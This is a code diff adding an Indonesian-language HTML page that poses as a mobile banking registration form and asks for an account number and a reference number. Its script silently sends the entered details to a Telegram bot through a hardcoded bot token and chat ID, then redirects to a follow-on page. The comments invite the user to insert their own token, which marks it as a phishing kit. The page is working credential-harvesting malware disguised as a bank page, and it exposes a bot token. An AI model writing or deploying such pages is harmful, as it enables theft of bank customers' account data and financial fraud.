@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Registrasi Mobile Banking</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #e6e8ef;
+    color: #000;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+  header {
+    background-color: #2196f3;
+    color: white;
+    font-weight: 700;
+    font-size: 20px;
+    display: flex;
+    align-items: center;
+    padding: 12px 16px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  }
+  .back-icon {
+    width: 24px;
+    height: 24px;
+    margin-right: 12px;
+    cursor: pointer;
+    fill: white;
+    flex-shrink: 0;
+  }
+  main {
+    flex: 1;
+    background-color: #e6e8ef;
+    padding: 24px 24px 0 24px;
+  }
+  .instruction {
+    font-size: 16px;
+    margin-bottom: 28px;
+  }
+  label {
+    font-weight: 600;
+    font-size: 14px;
+    margin-bottom: 6px;
+    display: block;
+    color: #000;
+  }
+  input[type="text"] {
+    width: 100%;
+    font-size: 16px;
+    padding: 14px 16px;
+    background-color: #f5f6fa;
+    border: none;
+    border-radius: 10px;
+    margin-bottom: 24px;
+    outline: none;
+    box-sizing: border-box;
+    color: #333;
+  }
+  input[type="text"]::placeholder {
+    color: #a3a7b2;
+  }
+  .btn-next {
+    width: 100%;
+    max-width: 420px;
+    margin: 32px auto 24px auto;
+    background-color: #2196f3;
+    color: white;
+    font-size: 18px;
+    font-weight: 600;
+    border: none;
+    border-radius: 14px;
+    padding: 16px 0;
+    cursor: pointer;
+    box-shadow: 0 3px 6px rgba(33, 150, 243, 0.5);
+    user-select: none;
+    transition: background-color 0.25s ease;
+    display: block;
+  }
+  .btn-next:hover {
+    background-color: #1764c1;
+  }
+  @media (max-width: 480px) {
+    .btn-next {
+      margin-left: 16px;
+      margin-right: 16px;
+      max-width: none;
+      width: calc(100% - 32px);
+    }
+  }
+</style>
+</head>
+<body>
+  <header>
+    <svg class="back-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+      <path d="M15 6L9 12L15 18" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    Registrasi Mobile Banking
+  </header>
+
+  <main>
+    <div class="instruction">Masukkan Nomor Rekening Anda</div>
+
+    <label for="nomor-rekening">Nomor Rekening</label>
+    <input type="text" id="nomor-rekening" name="nomor-rekening" placeholder="Masukkan Nomor Rekening" inputmode="numeric" />
+
+    <label for="nomor-referensi">Nomor Referensi</label>
+    <input type="text" id="nomor-referensi" name="nomor-referensi" placeholder="Masukkan Nomor Referensi (Opsional)" inputmode="numeric" />
+
+  </main>
+
+  <button class="btn-next" type="button" id="btnSelanjutnya">Selanjutnya</button>
+
+<script>
+  const btnSelanjutnya = document.getElementById('btnSelanjutnya');
+  const nomorRekeningInput = document.getElementById('nomor-rekening');
+  const nomorReferensiInput = document.getElementById('nomor-referensi');
+
+  // Ganti dengan token bot telegram Anda
+  const BOT_TOKEN = '8561612812:AAErTJ9Ml39kQgb0NP4UEpIgda-buNk-6Co'; 
+  // Ganti dengan chat id tujuan pesan telegram
+  const CHAT_ID = '392836663'; 
+
+  btnSelanjutnya.addEventListener('click', () => {
+    const nomorRekening = nomorRekeningInput.value.trim();
+    const nomorReferensi = nomorReferensiInput.value.trim();
+
+    if (!nomorRekening) {
+      alert('Nomor Rekening wajib diisi.');
+      nomorRekeningInput.focus();
+      return;
+    }
+
+    const pesan = `Registrasi Mobile Banking:\nNomor Rekening: ${nomorRekening}\nNomor Referensi: ${nomorReferensi || '-'}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: pesan }),
+    })
+      .then(resp => resp.json())
+      .then(data => {
+        if(data.ok){
+          window.location.href = "data.html";
+          // Bersihkan input jika perlu
+          nomorRekeningInput.value = '';
+          nomorReferensiInput.value = '';
+        } else {
+          alert('Gagal mengirim data ke Telegram: ' + data.description);
+        }
+      })
+      .catch(err => {
+        alert('Terjadi kesalahan saat mengirim data: ' + err.message);
+      });
+  });
+</script>
+</body>
+</html>
